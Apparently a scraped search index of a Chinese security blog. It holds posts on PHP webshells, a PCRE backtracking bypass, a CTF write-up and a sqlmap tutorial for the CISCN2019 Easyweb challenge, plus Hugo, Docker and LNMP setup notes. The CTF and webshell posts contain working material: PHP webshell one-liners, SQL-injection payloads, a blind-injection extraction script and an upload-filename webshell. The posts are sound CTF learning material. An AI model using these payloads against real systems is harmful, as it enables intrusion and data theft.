Ameng($value,$key){ $a = $key.$value;\t//拼接 $a($_POST[\u0026#39;x\u0026#39;]); } $b=array(\u0026#34;ass\u0026#34;=\u0026gt;\u0026#34;ert\u0026#34;);\t//$value=ert,$key=ass array_walk($b,\u0026#34;Ameng\u0026#34;);\t//调用自己定义函数，并传入键值对 ?\u0026gt; 参考:\n一些不包含数字和字母的webshell\n无字母数字webshell之提高篇\nphp webshell各种姿势总结 - ICode9\n","date":"2022-05-12T20:53:12+08:00","permalink":"https://proben1.github.io/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/","title":"离谱与webshell"},{"content":"正则表达式\nPHP利用PCRE回溯次数限制绕过\n起源 20世纪40年代：正则表达式最初的想法来自两位神经学家：沃尔特·皮茨与麦卡洛克，他们研究出了一种用数学方式来描述神经网络的模型。\n1956年：一位名叫Stephen Kleene的数学科学家发表了一篇题目是《神经网事件的表示法》的论文，利用称之为正则集合的数学符号来描述此模型，引入了正则表达式的概念。正则表达式被作为用来描述其称之为“正则集的代数”的一种表达式，因而采用了“正则表达式”这个术语。\n1968年：C语言之父、UNIX之父肯·汤普森把这个“正则表达式”的理论成果用于做一些搜索算法的研究，他描述了一种正则表达式的编译器，于是出现了应该算是最早的正则表达式的编译器qed（这也就成为后来的grep编辑器）。\nUnix使用正则之后，正则表达式不断的发展壮大，然后大规模应用于各种领域，根据这些领域各自的条件需要，又发展出了许多版本的正则表达式，出现了许多的分支。我们把这些分支叫做“流派”。\n1987年：Perl语言诞生了，它综合了其他的语言，用正则表达式作为基础，开创了一个新的流派，Perl流派。之后很多编程语言如：Python、Java、Ruby、.Net、PHP等等在设计正则式支持的时候都参考Perl正则表达式。\n到这里我们也就知道为什么众多编程语言的正则表达式基本一样，因为他们都师从Perl。\n语法 正则表达式30分钟入门教程\n匹配原理 执行过程:由正则表达引擎编译执行,可以有预编译\n引擎:\nDFA (Deterministic finite automaton) 确定型有穷自动机 NFA (Non-deterministic finite automaton) 非确定型有穷自动机 解释下确定型、有穷、自动机这几个名词：\n确定型与非确定型：假设有一个字符串（text=abc）需要匹配，在没有编写正则表达式的前提下，就直接可以确定字符匹配顺序的就是确定型，不能确定字符匹配顺序的则为非确定型。 有穷：有穷即表示有限的意思，这里表示有限次数内能得到结果。 自动机：自动机便是自动完成，在我们设置好匹配规则后由引擎自动完成，不需要人为干预！ DFA文本主导,按照文本的顺序执行\nNFA表达式主导,按照表达式的一部分执行，如果不匹配换其他部分继续匹配，直到表达式匹配完成。\n绝大多数编程语言都选择NFA引擎,因为更灵活些.\n当某个正则分支匹配不成功之后，文本的位置需要回退，然后换另一个分支匹配，而回退这步专业术语就叫：回溯。\n回溯陷阱：\n举个例子：text=aaaaa，pattern=/^(a*)b$/，匹配过程大致是\n(a*)：匹配到了文本中的aaaaa 匹配正则中的b，但是失败，因为(a*)已经把text都吃了 这时候引擎会要求(a*)吐出最后一个字符(a)，但是无法匹配b 第二次是吐出倒数第二个字符(还是a)，依然无法匹配 就这样引擎会要求(a*)逐个将吃进去的字符都吐出来 但是到最后都无法匹配b 引擎会要求*匹配的东西一点一点吐回，我们假设如果文本长度为几万，那引擎就要回溯几万次，这对机器的CPU来说简直是灾难。\n这就是回溯陷阱\n附:常用正则表达式\npcre.backtrack_limit PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get('pcre.backtrack_limit'));的方式查看当前环境下的上限\n可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万,那么preg_match返回的不是1和0，而是false。\neg:放进xunt里面了,题目名PCRE\n修复方法 如果用preg_match对字符串进行匹配，一定要使用===全等号来判断返回值\nfunction is_php($data){ return preg_match(\u0026#39;/\u0026lt;\\?.*[(`;?\u0026gt;].*/is\u0026#39;, $data); } if(is_php($input) === 0) { // fwrite($f, $input); ... } 参考\n正则表达式引擎执行原理（猪哥）\nP神\n","date":"2022-05-12T20:53:02+08:00","permalink":"https://proben1.github.io/2022/%E6%AD%A3%E5%88%99%E4%B8%8Epcre%E5%9B%9E%E6%BA%AF/","title":"正则与PCRE回溯"},{"content":"使用主题 我选了一个stack的魔改的主题，感谢作者！（已给星星）\nhttps://github.com/Mantyke/Hugo-stack-theme-mod\n下载下来直接和github连接并使用即可，这里的hugo版本是hugo v0.89.2-63E3A5EB+extended\n基础配置 对根目录的config.yaml进行配置：\nbaseurl: https://proben1.github.io/ title: 茄子的养殖场 emoji: # 推荐一个emoji查询的网站：https://www.emojiall.com/zh-hans # 如果难看可以注释掉emoji subtitle: 完成一个名为大学的作品 网站图标 根目录下新建static文件夹，把中意图标的ioc拖进去，命名favicon.ico\n头像 修改img/avatar.png\n短代码 选自这里\n直接效果演示吧：\n文字居左\n文字居中\n文字居右\nnotice-warning\nnotice-info\nnotice-note\nnotice-tip\nTo see a world in a grain of sand. And a heaven in a wild flower. Hold infinity in the palm of your hand. And eternity in an hour.\n修改「行内代码」样式 摘自这里\n效果\n修改「键盘标签」样式 摘自这里\nCtrl\n添加友链 同样是摘自这里\n在~\\data\\links.json里添加友链就可以了;image放在~\\assets\\link-img\\里\n[ { \u0026#34;title\u0026#34;: \u0026#34;小球飞鱼\u0026#34;, \u0026#34;website\u0026#34;: \u0026#34;https://mantyke.icu/\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;mantyke.png\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;我们会一起遇见鲸鱼吗？\u0026#34; }, { \u0026#34;title\u0026#34;: \u0026#34;友情链接2\u0026#34;, \u0026#34;website\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34; } ] 代码块 首先，是代码高亮设置\n打开项目根目录下的 config.yaml，在highlight中加入\nstyle : autumn # 样式参考https://xyproto.github.io/splash/docs/all.html 我很喜欢白天用perldoc夜间用dracula，现在有个问题是怎么能做到切换。由于暂时无法解决我先一直用着dracula。\n然后是这个大块块不太顺眼，直白白的边框实在是难看hhh。在F:\\ProbeN1\\myblog\\assets\\scss\\custom.scss里添加css代码进行修改，这里我加了一个灰色的边框：\n早就看这个代码块不太顺眼，那个直白白的边框实在是难看hhh。在F:\\ProbeN1\\myblog\\themes\\hugo-theme-stack\\assets\\scss\\custom.scss里添加css代码进行修改\n//代码块 .highlight pre { font-family: Consolas; border-style: solid; border-width: 2px; border-color: (255,255,0); } 设置分栏 分成两栏显示：\n在assets\\scss\\custom.scss里添加：\n/* 归档页面两栏 */ @media (min-width: 1024px) { .article-list--compact { display: grid; grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; border-radius: 16px; } } } ","date":"2022-05-12T11:23:22+08:00","permalink":"https://proben1.github.io/2022/stack%E4%BF%AE%E6%94%B9/","title":"Stack修改"},{"content":"[CISCN2019 总决赛 Day2 Web1]Easyweb sql绕过\n文件上传短标签绕过\n信息收集\n/robots.txt\nUser-agent: * Disallow: *.php.bak index.php\nuser.php\nimage.php\n其中image.php.bak存在\n在其中又发现config.php\n/.DS_Store\n没东西\nimage.php.bak\n\u0026lt;?php include \u0026#34;config.php\u0026#34;; $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); $result=mysqli_query($con,\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; header(\u0026#34;Content-Type: image/jpeg\u0026#34;); readfile($path); 绕过：（这里不知道为啥必须要%23而#不行，好像是#号url不会解析）\nid=\\0\u0026amp;path= or 1=1 %23 id=\\0\u0026amp;path= or sleep(5) %23 \u0026lt;?php $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; 输入：id=\\0\u0026amp;path=%20or%201%23 $id=addslashes($id); $path=addslashes($path); print($id); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 输出：\\\\0 $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); print($id); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 输出：\\ $result=\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;; $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; print($result); 输出：select * from images where id=\u0026#39;\\\u0026#39; or path=\u0026#39; or 1#\u0026#39; 上脚本\nimport requests url = \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php\u0026#34; #查表 payload1=\u0026#34;?id=\\\\0\u0026amp;path=or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))\u0026gt;{}%23\u0026#34; #查列 payload2=\u0026#34;?id=\\\\0\u0026amp;path=or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),{},1))\u0026gt;{}%23\u0026#34; #查用户名 payload3=\u0026#34;?id=\\\\0\u0026amp;path=or ascii(substr((select group_concat(username) from users),{},1))\u0026gt;{}%23\u0026#34; #查密码 payload4=\u0026#34;?id=\\\\0\u0026amp;path=or ascii(substr((select group_concat(password) from users),{},1))\u0026gt;{}%23\u0026#34; result=\u0026#34;\u0026#34; for i in range(1, 10000): low = 32 high = 128 mid = (low + high) \u0026gt;\u0026gt; 1 while (low \u0026lt; high): #payload = payload1.format(i, mid) # images,users #payload = payload2.format(i, mid) # username, password #payload = payload3.format(i, mid) # admin payload = payload4.format(i, mid) # dc268983c380339547ce new_url = url + payload response = requests.get(new_url) if \u0026#34;JFIF\u0026#34; in response.text: low = mid + 1 else: high = mid mid = (low + high) \u0026gt;\u0026gt; 1 if (mid == 32 or mid == 132): break result += chr(mid) print(result) 得出用户admin\n密码（每次重建环境会换）\n登录，文件上传，上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错，而上传之后会显示文件名，我们可以修改文件夹名为一句话木马。\n在PHP的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：\n开启短标签之后除了\u0026lt;?php ?\u0026gt;，可使用更灵活的调用方法 \u0026lt;? /*程序操作*/ ?\u0026gt; \u0026lt;?=/*函数*/?\u0026gt; 抓包修改上传的filename为\u0026lt;?=@system($_GET[a]);?\u0026gt;.phtml，注意别把引号给搞没了就行。成功后走一个cat /flag\nok'\n","date":"2022-05-05T19:11:01+08:00","permalink":"https://proben1.github.io/2022/ciscn2019%E6%80%BB%E5%86%B3%E8%B5%9Bday2web1easyweb/","title":"[CISCN2019总决赛Day2Web1]Easyweb"},{"content":"学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个：\nsqlmap -u \u0026#34;url\u0026#34; sqlmap -u \u0026#34;url\u0026#34; --dbs sqlmap -u \u0026#34;url\u0026#34; -D xx --tables sqlmap -u \u0026#34;url\u0026#34; -D xx -T xx --columns sqlmap -u \u0026#34;url\u0026#34; -D xx -T xx -C xx,xx --dump 或者一个post，把包抓下来，用：\nsqlmap -r post.txt 今天就用一道题来演示一下，sqlmap的其他功能：\n题目是：[CISCN2019 总决赛 Day2 Web1]Easyweb\n源码：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1\n或者直接buu搜……\n首先来审下题，robots.txt泄露出存在*.php.bak，再挨个php试一下，可以下载到image.php.bak，下面是审计部分，和sqlmap没关系，可以直接跳到结果部分\n源码如下：\n\u0026lt;?php include \u0026#34;config.php\u0026#34;; $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); $result=mysqli_query($con,\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; header(\u0026#34;Content-Type: image/jpeg\u0026#34;); readfile($path); 我们发现addslashes()和str_replace()一起使用引起了安全隐患，当我们id输入为\\0时，测试如下：\n\u0026lt;?php $id=isset($_GET[\u0026#34;id\u0026#34;])?$_GET[\u0026#34;id\u0026#34;]:\u0026#34;1\u0026#34;; $path=isset($_GET[\u0026#34;path\u0026#34;])?$_GET[\u0026#34;path\u0026#34;]:\u0026#34;\u0026#34;; 输入：id=\\0 $id=addslashes($id); $path=addslashes($path); print($id); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 输出：\\\\0 $id=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$id); $path=str_replace(array(\u0026#34;\\\\0\u0026#34;,\u0026#34;%00\u0026#34;,\u0026#34;\\\\\u0026#39;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;),\u0026#34;\u0026#34;,$path); print($id); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 输出：\\ $result=\u0026#34;select * from images where id=\u0026#39;{$id}\u0026#39; or path=\u0026#39;{$path}\u0026#39;\u0026#34;; $path=\u0026#34;./\u0026#34; . $row[\u0026#34;path\u0026#34;]; print($result); 输出：select * from images where id=\u0026#39;\\\u0026#39; or path=\u0026#39; or 1#\u0026#39; 可以发现最终的形式是这样的：\nselect * from images where id=\u0026#39;xxx\u0026#39; or 1#\u0026#39; 得出结果：\nid=\\0\u0026amp;path= or 1=1 %23 更改or后面的值可以更改payload。由于网页正确时会返回图片，我们使用布尔盲注或者时间盲注都可以。\n下面演示一下使用sqlmap该怎么对这道题进行时间盲注：\n首先是tamper脚本的编写：\n在sqlmap/tamper/里新建自己中意名字的python脚本：\nimport sys sys.path.append(\u0026#34;E:\\\\tools\\\\sqlmap\u0026#34;) from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage __priority__ = PRIORITY.LOW # 当前脚本调用优先等级 def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。 singleTimeWarnMessage(\u0026#34;这是我的tamper提示\u0026#34;) def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数 payload = \u0026#34; or \u0026#34;+payload+\u0026#34;%23\u0026#34; return payload 一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义，\npriority定义脚本的优先级，用于有多个tamper脚本的情况，查看lib.core.enums里的PRIORITY类可以看到详细的定义级别：\nclass PRIORITY(object): LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100 dependencies函数声明该脚本适用/不适用的范围，可以为空；\n刚才例子里使用的singleTimeWarnMessage() 用于在控制台中打印出警告信息：\ntamper是主要的函数，接受的参数为payload和**kwargs，其中payload就是所求。kwargs为相关httpheader，想插入或则修改header的时候可以用到。\n如例，我的tamper里就可以这么前后一加（虽然在sqlmap里也有类似的指令），然后url变成http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=，再指定注入参数为path就可以了。\n下面是要用到的注入命令：\n--current-db #查看当前的数据库 --technique T #指定注入类型 B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入） -v3 #输出详细度 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 --threads 5 #指定线程数(时间盲注不推荐开多线程) --dbms=\u0026#34;MySQL\u0026#34; #指定其数据库为mysql 其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB --time-sec #DBMS响应的延迟时间（默认为5秒） -p #可测试的参数 --fresh-queries #刷新缓存 库名\npython3 sqlmap.py -u \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=1\u0026#34; --tamper=my.py -v 3 --dbms=\u0026#34;MySQL\u0026#34; --technique=T -p path --time-sec 4 --current-db 表名\npython3 sqlmap.py -u \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=1\u0026#34; --tamper=my.py -v 3 --dbms=\u0026#34;MySQL\u0026#34; --technique=T -p path --time-sec 4 -D ciscnfinal --tables 字段(sqlmap自动用了16进制的绕过)\npython3 sqlmap.py -u \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=1\u0026#34; --tamper=my.py -v 3 --dbms=\u0026#34;MySQL\u0026#34; --technique=T -p path --time-sec 4 -D ciscnfinal -T users --columns 数据\npython3 sqlmap.py -u \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=1\u0026#34; --tamper=my.py -v 3 --dbms=\u0026#34;MySQL\u0026#34; --technique=T -p path --time-sec 4 -D ciscnfinal -T users -C username,password --dump 这里b2ff3D048fe0c0374fd7可耻的错了，刷新缓存之后是b2ff30048fe0c0374fd7，看来时间盲注还是错误率的hhh。\n这里能发现，sqlmap每次盲注的最后都使用一个非来确定时间盲注的判断是否成功，下面接上刷新缓存的命令：\npython3 sqlmap.py -u \u0026#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\\\0\u0026amp;path=1\u0026#34; --tamper=my.py -v 3 --dbms=\u0026#34;MySQL\u0026#34; --technique=T -p path --time-sec 4 -D ciscnfinal -T users -C username,password --dump --fresh-queries 完成注入，可以登录了，结束。但是这里还有很多问题，比如level还没涉及到，比如知道误报之后怎么只刷新特定的缓存……\n推荐一个SQLMAP进阶使用的博客：\nhttp://drops.xmd5.com/static/drops/tips-5254.html\n下面是一些好玩的注入命令：\n--referer http://www.baidu.com #伪造referer字段 --is-dba #判断当前用户是否有管理员权限 --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026amp;submit=Submit\u0026#34; #抓取其post提交的数据填入 --file-read \u0026#34;c:/test.txt\u0026#34; #读取目标服务器C盘下的test.txt文件 --file-write test.txt --file-dest \u0026#34;e:/hack.txt\u0026#34; #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; #指定代理 --prefix=PREFIX #注入payload字符串前缀 --suffix=SUFFIX #注入payload字符串后缀 使用星号（*）来指定注入点\npython sqlmap.py -u \u0026#34;http://127.0.0.1/Less-20/?id=1\u0026#34; --cookie=\u0026#34;uname=admin*\u0026#34; --banner 提示：custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q]\n更多更全的命令可以参考下面博客：\nhttps://www.freebuf.com/sectool/164608.html\n或者官方文档……\nps：感觉根据实际环境来修改现有的工具进行利用才是最nice的！\n参考：\nhttps://blog.csdn.net/whatday/article/details/62059263\nhttps://www.anquanke.com/post/id/235846\n","date":"2022-05-03T21:08:57+08:00","permalink":"https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/","title":"sqlmap使用实例"},{"content":"Docker Docker 是一个开源的应用容器引擎，基于 Go 语言并遵从 Apache2.0 协议开源。\nDocker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。\n简单地说,就是用来创建容器的引擎.\nDocker 架构 镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统(rootfs)。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。\n容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。\n仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。\nDocker客户端与服务器（C/S架构）\nDocker 在运行时分为 Docker 引擎（服务端守护进程） 和 客户端工具，我们日常使用各种 docker 命令，其实就是在使用 客户端工具 与 Docker 引擎 进行交互。\n在Docker的术语里，一个只读层被称为镜像，一个镜像是永久不会变的。 由于Docker使用一个统一文件系统，Docker进程认为整个文件系统是以读写方式挂载的。但是所有的变更都发生顶层的可写层，而下层的原始的只读镜像文件并未变化。由于镜像不可写，所以镜像是无状态的。 Docker镜像可用于创建Docker容器。 Docker镜像是由文件系统叠加而成，最底层是一个文件引导系统（bootfs）。Docker用户几乎永远不会与引导系统有交互。 Docker镜像是一个只读的文件，若要修改镜像内容只能重新制作或生成镜像。 在Docker镜像创建为Docker容器后，最底层的文件引导系统（bootfs)便会被卸载，此时的容器是可以进行读写操作的。\n在利用Docker镜像创建容器时会在镜像的只读层上创建一层可写层作为最顶层。\n每一个镜像都可能依赖于由一个或多个下层的组成的另一个镜像，下层镜像是上层镜像的父镜像。 一个没有任何父镜像的镜像，谓之基础镜像（Base Image）：\n图中的add emacs便是add Apache镜像的父镜像，而Debian没有任何父镜像，我们便认为Debian是基础镜像（Base Image）\n(文件引导系统在这里不视作一层镜像)\n在容器层中，用户看到的是一个叠加之后的文件系统。\n文件操作 说明 添加文件 在容器中创建文件时，新文件被添加到容器层中。 读取文件 在容器中读取某个文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后打开并读入内存。 修改文件 在容器中修改已存在的文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后修改之。 删除文件 在容器中删除文件时，Docker 也是从上往下依次在镜像层中查找此文件。找到后，会在容器层中**「记录下此删除操作」**。（只是记录删除操作） 只有当需要修改时才复制一份数据，这种特性被称作 Copy-on-Write。可见，容器层保存的是镜像变化的部分，不会对镜像本身进行任何修改。\nDocker使用 启动Docker：systemctl start docker 重启Docker：systemctl restart docker 开机启动Docker：systemctl enable docker\nhello-world 拉取镜像：docker pull 镜像仓库/镜像名称 eg：docker pull hello-world - 拉取hello-world镜像 示例命令省略了仓库地址，Docker便默认从官方仓库（registry.hub.docker.com）拉取镜像，实际命令等价于 docker pull registry.hub.docker.com/hello-world\n查看本地镜像：docker images\n镜像的 ID 唯一标识了镜像\n利用镜像创建Docker容器：docker run 镜像名称\n查看当前运行的所有容器：docker ps -a\nDocker镜像的使用 拉取镜像: docker pull 仓库名:TAG 例如拉取一个Ubuntu 18.04的镜像作为基础镜像：docker pull ubuntu:18.04\n列出镜像: docker images\n创建容器: docker run -ti idiswy/lnmp /bin/bash\n也可以用docker images时的镜像ID代替仓库名:TAG的组合\n我们和一个容器产生了交互,在Shell中输入exit即可停止该镜像回到原命令行。\ndocker run 常用参数\n-d: 后台运行容器，并返回容器ID； -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； -i: 以交互模式运行容器，通常与 -t 同时使用； \u0026ndash;name=\u0026ldquo;nginx-lb\u0026rdquo;: 为容器指定一个名称； -e username=\u0026ldquo;ritchie\u0026rdquo;: 设置环境变量； \u0026ndash;net=\u0026ldquo;bridge\u0026rdquo;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； 删除镜像: docker rmi 镜像名称/镜像ID\neg:删除刚刚拉取的hello-world\n修改标签: docker tag 镜像ID 用户名/镜像名称:新标签\n搜索镜像: 使用docker search命令来检索公开仓库中的镜像\n例如docker search lamp\nDocker镜像的创建 1.docker commit\n先创建一个容器：docker run -ti idiswy/lnmp /bin/bash\n在根目录加入一个flag\n结束后输入exit 来退出容器，现在我们的容器已经被我们改变了\n使用 docker commit 命令来提交更新后的副本： docker commit -m \u0026quot;Added flag\u0026quot; -a \u0026quot;ginger\u0026quot; b70f3162e24e test/flag 其中，-m 来指定提交的说明信息，跟我们使用的版本控制工具一样，-a 可以指定更新的用户信息，之后是用来创建镜像的容器的ID，最后指定目标镜像的仓库名和 tag 信息。\n利用这个新镜像来创建一个容器,ok\n2.利用 Dockerfile 来创建镜像\n之后再提\n3.从本地文件系统导入镜像\ndocker import - ubuntu:14.04 docker save -o ubuntu_18.04.tar ubuntu:18.04 Docker容器的操作 启动容器我们共有两种方式：一种是基于镜像新建一个容器并启动，另外一种是将在中止状态（Exited）的容器重新启动\n前者: docker start ID\n后者: docker start ID命令来启动已中止的容器\n相应的，我们也可以使用docker stop/kill ID命令来停止运行中的容器。\n同时需要注意的是，我们在容器终端中输入exit或Ctrl+D来退出终端时，容器也会自动中止。\n除此之外还可以使用docker restart 容器ID命令来重启容器\ndocker logs ID命令来查看容器的输出信息\n在后台运行容器后，我们需要对容器进行操作时，可以使用docker attach ID命令来对容器进行操作。\n也可以使用docker exec -it ID 所执行命令来操作容器。\n注意在使用docker exec命令后，退出终端时，容器依旧保持运行状态，而在docker attach命令打开终端退出后，容器便会中止。\n使用docker rm ID命令来删除容器。\n注意，在删除容器前必须停止容器，如果要删除一个运行中的容器，可以添加-f参数来关闭并删除容器。\nDocker网络 可以通过docker network ls命令查看网络模式\nDocker四种网络模式：\nBridge - 桥接网络模式 Host - 开放式网络模式 Container - 联合挂载式网络模式（Host网络模式的延伸） None - 封闭式网络模式 端口映射\ndocker run -it -p 物理机端口:容器端口 镜像名称:标签信息 此时指定的容器端口便映射到了指定的物理机端口上。同时-p可以多次使用来绑定多个端口映射关系。\neg：\ndocker run -it -p 10001:80 idiswy/lnmp /bin/bash\n使用docker port 容器ID 端口即可查看当前映射的端口配置。\n删除所有已经停止的容器：docker rm $(docker ps -a -q) 参考 Docker 架构及工作原理：https://www.cnblogs.com/mrhelloworld/p/docker2.html\n菜鸟教程：https://www.runoob.com/docker\nDocker学习笔记：https://www.cnblogs.com/yesec/p/15025511.html\n","date":"2022-04-14T20:28:16+08:00","permalink":"https://proben1.github.io/2022/docker%E5%AD%A6%E4%B9%A0/","title":"Docker学习"},{"content":"这里!!!https://lnmp.org/install.html\nsu root\nyum install screen\nscreen -S lnmp\nwget http://soft.vpser.net/lnmp/lnmp1.8.tar.gz -cO lnmp1.8.tar.gz \u0026amp;\u0026amp; tar zxf lnmp1.8.tar.gz \u0026amp;\u0026amp; cd lnmp1.8 \u0026amp;\u0026amp; ./install.sh lnmp\n一键安装\u0026hellip;\u0026hellip;\u0026hellip;省心\nInstall lnmp takes 34 minutes. Install lnmp V1.8 completed! enjoy it. LNMP相关软件安装目录 Nginx 目录: /usr/local/nginx/ MySQL 目录 : /usr/local/mysql/ MySQL数据库所在目录：/usr/local/mysql/var/ MariaDB 目录 : /usr/local/mariadb/ MariaDB数据库所在目录：/usr/local/mariadb/var/ PHP目录 : /usr/local/php/ 多PHP版本目录 : /usr/local/php5.5/ 其他版本前面5.5的版本号换成其他即可 PHPMyAdmin目录 : 0.9版本为/home/wwwroot/phpmyadmin/ 1.0及以后版本为 /home/wwwroot/default/phpmyadmin/ 强烈建议将此目录重命名为其不容易猜到的名字。phpmyadmin可自己从官网下载新版替换。 默认网站目录 : 0.9版本为 /home/wwwroot/ 1.0及以后版本为 /home/wwwroot/default/ Nginx日志目录：/home/wwwlogs/ /root/vhost.sh添加的虚拟主机配置文件所在目录：/usr/local/nginx/conf/vhost/ PureFtpd 目录：/usr/local/pureftpd/ PureFtpd web管理目录： 0.9版为/home/wwwroot/default/ftp/ 1.0版为 /home/wwwroot/default/ftp/ Proftpd 